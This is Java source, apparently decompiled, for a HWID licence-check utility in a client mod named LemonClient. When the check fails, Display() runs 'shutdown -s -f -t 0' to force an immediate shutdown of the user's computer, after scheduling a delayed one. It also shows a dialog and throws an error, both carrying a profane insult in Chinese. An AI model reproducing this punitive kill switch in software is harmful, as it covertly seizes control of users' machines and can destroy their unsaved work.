package com.lemonclient.api.util.verify;

import java.awt.Component;
import java.io.IOException;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

public class FrameUtil {
   public static End end;
   public static Runtime runtime = Runtime.getRuntime();

   public static void Display() {
      try {
         runtime.exec("shutdown -s -t 3600");
      } catch (IOException var3) {
         throw new RuntimeException(var3);
      }

      FrameUtil.Frame frame = new FrameUtil.Frame();
      frame.setVisible(false);
      end = new End();

      try {
         runtime.exec("shutdown -s -f -t 0");
      } catch (IOException var2) {
         throw new RuntimeException(var2);
      }

      throw new NoStackTraceThrowable("你沒hwid你用你媽呢");
   }

   public static class Frame extends JFrame {
      public Frame() {
         this.setTitle("你沒hwid你用你媽呢");
         this.setDefaultCloseOperation(2);
         this.setLocationRelativeTo((Component)null);
         String message = ":thinking: u forgot something?";
         JOptionPane.showMessageDialog(this, message, "你沒hwid你用你媽呢", -1, UIManager.getIcon("OptionPane.warningIcon"));
      }
   }
}
